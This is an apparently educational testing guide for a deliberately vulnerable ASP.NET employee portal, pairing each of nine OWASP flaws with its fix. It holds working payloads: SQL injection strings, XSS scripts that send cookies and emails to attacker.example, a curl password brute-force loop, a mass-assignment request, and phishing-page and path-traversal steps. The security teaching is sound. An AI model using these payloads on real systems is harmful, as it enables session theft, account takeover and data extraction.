# Testing Guide — All 9 Vulnerabilities

Use this guide alongside Burp Suite, browser DevTools, or curl. Run the app in **Vulnerable mode** first, exploit each flaw, then switch to **Secure mode** and confirm the fix holds.

---

## 1 — SQL Injection (Employee Search)

**Route:** `GET /Employees?q=<payload>`  
**OWASP:** A03 Injection  
**What's wrong:** The search term is concatenated directly into a raw SQL string using C# string interpolation. The resulting query is passed to SQLite verbatim — the database never sees the input as a value, only as part of the SQL grammar.

### Exploit — bypass the WHERE filter

```
Search box: ' OR '1'='1
```

This transforms the query from:
```sql
SELECT * FROM AspNetUsers WHERE FullName LIKE '%<input>%'
```
into:
```sql
SELECT * FROM AspNetUsers WHERE FullName LIKE '%' OR '1'='1%'
```
The condition `'1'='1'` is always true, so all rows are returned regardless of the search term. Every account — including admin — appears in the results.

### Exploit — UNION-based data extraction

```
' UNION SELECT Id,UserName,Email,FullName,Department,0,'' FROM AspNetUsers--
```

This appends a second SELECT statement that dumps a second copy of the users table. Useful for demonstrating that an attacker can extract arbitrary columns.

**What to observe:** All users appear, including `admin@acme.com`, even though none of them match the injected search term.

### Secure mode

Search the same payloads. EF Core's `.Where(u => EF.Functions.Like(u.FullName, $"%{query}%"))` translates to a **parameterised query** — the `'` character is passed as a bind variable value, not interpolated into the SQL grammar. It matches no names and returns zero rows.

---

## 2 — Stored XSS (Announcements)

**Route:** `GET /Announcements/Details/{id}`  
**OWASP:** A03 Injection  
**What's wrong:** Announcement content is stored in the database as-is and then rendered with `Html.Raw()` in the Razor view. This bypasses ASP.NET Core's automatic HTML encoding, causing any HTML or JavaScript in the content to execute in the victim's browser.

### Exploit — basic proof of concept

1. Log in as any user. Navigate to **Announcements → New Announcement**.
2. Enter:
   - Title: `Test`
   - Content: `<script>alert('XSS: ' + document.cookie)</script>`
3. Click **Publish**, then open the announcement details page.
4. A dialog appears showing the current session cookie value.

### Exploit — simulated cookie theft

Content:
```html
<script>
  var img = new Image();
  img.src = 'http://attacker.example/steal?c=' + encodeURIComponent(document.cookie);
</script>
```
Any user who views this announcement's details page sends their session cookie to the attacker's server via an image request. Combined with Vulnerability #8 (Weak Remember-Me), the `RememberToken` cookie (which contains the user's email in plain Base64) is also stolen.

### Exploit — page defacement

Content:
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:red;font-size:3rem;display:flex;align-items:center;justify-content:center;z-index:9999">
  THIS SITE HAS BEEN COMPROMISED
</div>
```

**What to observe:** The payload executes immediately when the details page loads. Every subsequent visitor also triggers it — this is what makes it *stored* XSS rather than reflected.

### Secure mode

Post the same XSS payload. Razor's default `@Model.Content` encoding converts `<script>` to `&lt;script&gt;` — the browser renders it as visible text, not executable code.

---

## 3 — Broken Access Control — Admin Panel

**Route:** `GET /Admin`  
**OWASP:** A01 Broken Access Control  
**What's wrong:** `AdminController` has no `[Authorize]` attribute. The in-action authentication check only runs in Secure mode, so in Vulnerable mode the controller serves the full admin dashboard to any HTTP request — authenticated or not.

### Exploit

1. Log out completely (or open a private/incognito window with no session).
2. Navigate directly to: `/Admin`
3. The full admin panel loads, showing all user accounts (names, emails, departments, HR manager flags) and all pending expense reports.

**What to observe:** No login prompt. You have full admin visibility without any credentials.

### Chained attack

- Note the **User IDs** listed in the admin panel.
- Use those IDs with Vulnerability #9 (`/Profile?userId=<id>`) to pull individual profiles.
- Use the email addresses with Vulnerability #5 (no lockout) to brute-force passwords.

### Secure mode

The same URL redirects unauthenticated users to `/Account/Login`. Employees who do log in and then try `/Admin` receive **403 Forbidden** because the in-action check enforces the `Admin` role.

---

## 4 — IDOR — Expense Reports

**Route:** `GET /Expenses/Details/{id}`  
**OWASP:** A01 Broken Access Control  
**What's wrong:** Expense report IDs are sequential integers. The `Details` action fetches the report by ID and returns it immediately — there is no check that the requesting user owns the report.

### Exploit

1. Log in as `employee1@acme.com`. Navigate to **My Expenses** and note the report IDs in the links (e.g. `/Expenses/Details/2`).
2. Manually change the ID in the URL:
   ```
   /Expenses/Details/1
   /Expenses/Details/2
   /Expenses/Details/3
   ```
3. Report #3 belongs to Carol (`employee2@acme.com`). The page loads anyway, revealing her name, email, description, amount, and status.

**What to observe:** The **Employee** field on the details page shows a different user's name and email. The red "Not your record" badge also appears in Vulnerable mode to confirm the IDOR.

### Secure mode

The same request returns **403 Forbidden**. The `EmployeeId` field on the loaded report is compared against the current user's ID; a mismatch triggers `Forbid()`. Admin users can still view all reports.

---

## 5 — No Account Lockout (Brute Force)

**Route:** `POST /Account/Login`  
**OWASP:** A07 Identification and Authentication Failures  
**What's wrong:** `PasswordSignInAsync` is called with `lockoutOnFailure: false`. ASP.NET Identity only increments the failed-attempt counter when this flag is `true`, so an attacker can submit unlimited password guesses without the account ever locking.

### Exploit with curl

```bash
# 1. Fetch a login page and extract the anti-forgery token
TOKEN=$(curl -sc cookies.txt http://localhost:PORT/Account/Login \
  | grep -o 'value="[^"]*" name="__RequestVerificationToken"' \
  | head -1 | cut -d'"' -f2)

# 2. Iterate through a password list — no lockout occurs
for pass in password Password1 admin Admin123 Admin123!; do
  STATUS=$(curl -sb cookies.txt -c cookies.txt -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:PORT/Account/Login \
    -d "Email=admin@acme.com&Password=${pass}&__RequestVerificationToken=${TOKEN}")
  echo "$STATUS $pass"
done
```

A **302** response indicates a successful login (redirect to dashboard). A **200** is a failed attempt with the form re-rendered.

### Exploit with Burp Suite Intruder

1. Log in, intercept a login `POST` request, send it to **Intruder**.
2. Clear all positions, set the `Password` parameter as the injection point.
3. Load a wordlist (e.g. `rockyou.txt`).
4. Start the attack. Filter results by response length or status code — a `302` means the password was found.

**What to observe:** Every wrong password returns "Invalid login attempt." with no lockout, delay, or CAPTCHA — no matter how many attempts are made.

### Secure mode

`lockoutOnFailure: true` is passed. After 5 consecutive failures, Identity sets `LockoutEnd` in the database and all further attempts return "Account locked" for 5 minutes, regardless of the password submitted.

---

## 6 — Mass Assignment — Profile Elevation

**Route:** `POST /Profile/Edit`  
**OWASP:** A08 Software and Data Integrity Failures  
**What's wrong:** In Vulnerable mode, the `Edit` action reads `IsHrManager` directly from `Request.Form` — raw HTTP POST data — even though this field is never rendered in the form UI. An attacker who adds `&IsHrManager=true` to the POST body can promote themselves to HR Manager without admin involvement.

### Exploit with browser DevTools (Firefox / Chrome)

1. Log in as `employee1@acme.com`. Navigate to **My Profile → Edit Profile**.
2. Fill in any valid name and department.
3. Open **DevTools → Network tab**.
4. Submit the form normally.
5. Find the `POST /Profile/Edit` request. Right-click → **Edit and Resend** (Firefox) or copy as curl (Chrome).
6. In the request body, append: `&IsHrManager=true`
7. Send the modified request.
8. Navigate to `/Admin` — Bob Builder's row now shows **HR Manager: Yes**.

### Exploit with curl

```bash
# 1. Get anti-forgery token from login page
TOKEN=$(curl -sc cookies.txt http://localhost:PORT/Account/Login \
  | grep '__RequestVerificationToken' | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

# 2. Log in
curl -sb cookies.txt -c cookies.txt -s -o /dev/null \
  -X POST http://localhost:PORT/Account/Login \
  -d "Email=employee1@acme.com&Password=Employee123!&__RequestVerificationToken=${TOKEN}"

# 3. Get a fresh token from the edit page
EDIT_TOKEN=$(curl -sb cookies.txt http://localhost:PORT/Profile/Edit \
  | grep '__RequestVerificationToken' | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

# 4. Submit with the hidden IsHrManager field injected
curl -sb cookies.txt -s -o /dev/null -w "%{http_code}" \
  -X POST http://localhost:PORT/Profile/Edit \
  -d "FullName=Bob+Builder&Department=Engineering&IsHrManager=true&__RequestVerificationToken=${EDIT_TOKEN}"
```

**What to observe:** After the request, open `/Admin` — the user's HR Manager status has changed to Yes, a privilege that should only be grantable by an administrator.

### Secure mode

The `POST` action binds to `ProfileEditViewModel`, which exposes only `FullName` and `Department`. The model binder ignores any form fields not declared in the DTO, so `IsHrManager` is simply discarded. The value in the database does not change.

---

## 7 — Insecure File Upload

**Route:** `POST /Expenses/Upload/{id}`  
**OWASP:** A01 Broken Access Control  
**What's wrong:** `VulnerableFileUploadService.IsAllowed()` always returns `true`. The original filename from the browser is used verbatim as the stored filename, and the file is written to `wwwroot/uploads/` — a directory served as static files without authentication.

### Exploit 1 — host a phishing page

1. Create a file named `login.html` containing a fake Acme login form that POSTs credentials to an attacker-controlled server.
2. Upload it via any expense report's attachment form.
3. The file is immediately accessible at `/uploads/login.html` — no login required.
4. Share the link. Victims see a convincing Acme-branded page.

### Exploit 2 — arbitrary file hosting

Upload a file named `config.bak` containing fake (or real) secret data. Navigate to `/uploads/config.bak` — the browser downloads or displays it with no authentication check.

### Exploit 3 — path traversal (theoretical)

Because the filename is passed directly to `Path.Combine(uploadsDir, file.FileName)`, a filename like `../../appsettings.json` would attempt to write outside `wwwroot/uploads/`. The OS or web server permissions may block the write, but the application has no defence of its own.

**What to observe:** After uploading, the attachment link on the expense details page opens directly in a new browser tab at `/uploads/<original-filename>` without any authentication.

### Secure mode

- Attempting to upload a `.html`, `.php`, `.exe`, or any file not on the whitelist returns: **"File type not allowed. Permitted: PDF, JPG, PNG, DOC, DOCX."**
- Allowed uploads are stored with a GUID filename (e.g. `3f7a...b2.pdf`) — the original name is not exposed in the URL.
- Downloads go through `/Expenses/Download/{attachmentId}`, which verifies the requesting user owns the report before serving the file.

---

## 8 — Weak Remember-Me Token

**Route:** `POST /Account/Login` (with "Remember me" checked)  
**OWASP:** A07 Identification and Authentication Failures  
**What's wrong:** When "Remember me" is checked in Vulnerable mode, the server sets a custom cookie `RememberToken` whose value is simply `Base64(email)`. The cookie is marked `HttpOnly=false`, meaning JavaScript running on the page can read it. This amplifies the Stored XSS vulnerability — any injected script can steal the token and decode the victim's email address.

### Exploit — read the token via JavaScript

1. Log in with any account and check "Remember me".
2. Open browser DevTools console and paste:

```javascript
var cookie = document.cookie.split('; ')
  .find(c => c.startsWith('RememberToken='));

if (cookie) {
  var b64 = cookie.split('=')[1];
  console.log('Decoded email:', atob(b64));
}
```

**What to observe:** The console prints the logged-in user's email address, decoded from the cookie.

### Combined XSS + Remember-Me attack

Use the Stored XSS payload from Vulnerability #2, but replace `alert()` with cookie theft:

```html
<script>
  var token = document.cookie.split('; ')
    .find(c => c.startsWith('RememberToken='));
  if (token) {
    var email = atob(token.split('=')[1]);
    new Image().src = 'http://attacker.example/steal?email=' + encodeURIComponent(email);
  }
</script>
```

Post this as an announcement. Every user who has "Remember me" active and opens the announcement leaks their email to the attacker's server.

### Secure mode

"Remember me" uses ASP.NET Identity's built-in persistent cookie (`.AspNetCore.Identity.Application`) with `isPersistent: true`. That cookie is:
- **HttpOnly** — JavaScript cannot access it.
- **Cryptographically signed** — the value is an opaque token with no decodable user data.
- **Managed by Identity** — it expires, rotates on re-authentication, and is revoked on sign-out.

---

## 9 — Sensitive Data Exposed via URL — Profile Lookup

**Route:** `GET /Profile?userId=<any-id>`  
**OWASP:** A02 Cryptographic Failures / A09 Security Logging and Monitoring Failures  
**What's wrong:** In Vulnerable mode, the `Profile/Index` action accepts a `userId` query parameter and looks up any user by that ID, regardless of who is currently logged in. The looked-up user ID is also written to the application log in plaintext, creating a log-leakage vector.

### Exploit

1. Get user IDs from `/Admin` (no login needed in Vulnerable mode) or from the Employee Directory (IDs shown in the table).
2. Navigate to:
   ```
   /Profile?userId=<id-of-admin-or-any-other-user>
   ```
3. The profile page loads showing the target's full name, email, department, and HR Manager status.

**What to observe:** An orange alert confirms you are viewing someone else's profile. The "User ID (exposed)" field is also visible in the profile card.

### Log leakage

While the app is running, watch the terminal. Each profile request prints:

```
info: Portal.Web.Controllers.ProfileController[0]
      Profile viewed: userId=<uuid> requested by employee1@acme.com
```

An attacker with access to application logs can enumerate which accounts were accessed and by whom, and harvest user IDs for use in other attacks.

### Chained attack

1. Visit `/Admin` (unauthenticated — Vulnerability #3).
2. Note email addresses and user IDs.
3. Visit `/Profile?userId=<each-id>` to pull full profile data on every employee.
4. Use the emails with Vulnerability #5 (no lockout) to brute-force credentials.

### Secure mode

The `userId` parameter is silently ignored. `/Profile?userId=<any-id>` always returns the profile of the currently logged-in user. No user IDs appear in the application logs.

---

## Switching Between Modes

```bash
# Vulnerable (default)
dotnet run --project src/Portal.Web --launch-profile Vulnerable

# Secure
dotnet run --project src/Portal.Web --launch-profile Secure
```

Running both modes side-by-side during a demo is the most effective way to show before/after contrast. The home dashboard clearly states which profile is active and lists all enabled vulnerabilities.
